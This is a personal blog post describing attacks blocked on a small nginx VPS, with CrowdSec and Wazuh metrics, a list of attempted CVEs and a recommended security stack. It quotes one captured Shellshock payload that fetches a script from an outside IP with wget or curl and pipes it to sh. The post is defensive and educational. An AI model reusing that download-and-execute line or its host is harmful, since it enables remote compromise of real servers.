---
title: "Joining the War for Team Blue"
date: 2025-11-16
draft: false
description: "A real-world analysis of attack attempts on a small VPS infrastructure running nginx and basic services"
categories: ["Security", "Monitoring", "DevOps"]
tags: ["crowdsec", "wazuh", "nginx", "cybersecurity", "vps", "monitoring", "threat-detection"]
featuredImage: "/images/posts/cyber.jpeg"
readingTime: true
toc: true
author: "Andrew Jones"
authorBio: "IT professional documenting the reality of internet security for small infrastructure"
socialShare: true
---

## My Digital Wake-Up Call

I'm new to the reality of the internet as a battleground—though maybe it always was one. I've recently taken the plunge, striving to learn as much as I can and develop my skills in multiple areas simultaneously, especially cybersecurity.

This journey has led me to a much more serious consideration of internet-facing security and the severe implications of ignoring it.

Waking up to personal security alerts screaming that my infrastructure was under attack was a peculiar experience. Yet, it became a valuable learning opportunity. I decided not just to follow the automated tool's recommendations, but to go beyond them.

I proceeded to drop the foreign connection and then dove deeper, investigating the nature of the specific CVE that was being exploited.

The tools at my disposal—Crowdsec, Wazuh, and Netdata—have been incredible. It's been an amazing experience getting this stack working to my benefit and actually seeing the results of my implementation in real-time.

I am still learning, but it's the journey that interests me, not the destination.

Below are some details:

## Security Threat Surface Analysis

### Infrastructure Overview
| Component | Details |
|-----------|---------|
| **Server Type** | VPS (2 CPU, 4GB RAM) |
| **Monitoring** | Real-time log analysis, threat detection |

### Attack Metrics Summary

| Attack Category | Attempts Blocked | Severity | Details |
|-----------------|------------------|----------|---------|
| **HTTP Scanning** | 14,895 | High | Mass vulnerability scanning |
| **SSH Brute Force** | 2,625 | High | Password guessing attacks |
| **HTTP Exploits** | 165 | High | CVE exploitation attempts |
| **SMB Attacks** | 136 | Medium | File share brute force |
| **Spam Attempts** | 123 | Medium | SMTP abuse |
| **CVE Exploits** | 9 | High | Specific vulnerability attacks |
| **Bad User Agents** | 16 | Medium | Malicious bot traffic |
| **Open Proxy Abuse** | 2 | Medium | Proxy service attempts |

### Defense Performance

| Security Layer | Effectiveness | Metrics |
|----------------|---------------|---------|
| **CrowdSec** | Excellent | 18,364 IPs blocked |
| **Firewall Bouncer** | Excellent | 3.96GB processed safely |
| **Wazuh Detection** | Excellent | Real-time CVE alerts |
| **Community Blocklist** | Excellent | 18,362 IPs from CAPI |

### Traffic Analysis

| Log Source | Lines Processed | Threats Detected |
|------------|-----------------|------------------|
| nginx access.log | 89 lines | 87 whitelisted (legitimate traffic) |
| nginx error.log | 3 lines | Configuration issues |
| SSH service | 296 lines | Brute force patterns |
| Samba logs | 135 lines | File share attacks |

### Notable Attack Examples

#### Shellshock Exploit Attempt
```bash
# Detected and blocked by Wazuh
"() { :; }; /bin/bash -c \"(wget -qO- http://74.194.191.52/rondo.qre.sh||busybox wget -qO- http://74.194.191.52/rondo.qre.sh||curl -s http://74.194.191.52/rondo.qre.sh)|sh\""

**Source IP**: 192.159.99.95 (United Kingdom)

**Payload**: Multi-stage malware download

**Status**: Blocked by CrowdSec with manual firewall rule

## CVE Exploitation Attempts

- **CVE-2021-41773** (Apache Path Traversal) - 4 attempts
- **CVE-2021-42013** (Apache RCE) - 1 attempt
- **CVE-2017-9841** (PHPUnit RCE) - 3 attempts
- **ThinkPHP CVE-2018-20062** - 1 attempt

## Security Stack Effectiveness

| Tool | Role | Performance |
|------|------|-------------|
| **CrowdSec** | Behavioral detection | Excellent |
| **Wazuh** | SIEM & compliance | Excellent |
| **iptables** | Network filtering | Excellent |
| **nginx** | Web application firewall | Excellent |

```

## Key Takeaways

- **No Server is Too Small** - Even basic blogs attract significant attack attention
- **Automated Attacks Dominate** - 99% of attempts are scripted, not targeted
- **Layered Defense Works** - Multiple security tools provide comprehensive protection
- **Visibility is Crucial** - Without monitoring, attacks go undetected
- **Community Intelligence** - Crowd-sourced blocklists are incredibly effective

## Recommended Security Stack for Small VPS


# Essential Security Stack (for learning)

monitoring:
  - CrowdSec (behavioral analysis)
  - Wazuh (SIEM & compliance, overkill but an amazing thing to lean)
  - fail2ban (pattern blocking)

network:
  - iptables/ufw (firewall)
  - Cloudflare (DDoS protection)

application:
  - nginx with security headers
  - Regular vulnerability scanning


## Conclusion

Running internet-facing services means constant exposure to automated attacks. The metrics demonstrate that even a small VPS with basic services faces thousands of daily attack attempts. However, with proper security tooling and monitoring, these threats can be effectively mitigated.

The reality of modern internet security: your server will be attacked. The critical differentiator is whether you have the visibility to detect these attempts and the tools to respond effectively.
>
>"Security isn't about preventing all attacks; it's about detecting, responding, and learning from them."
>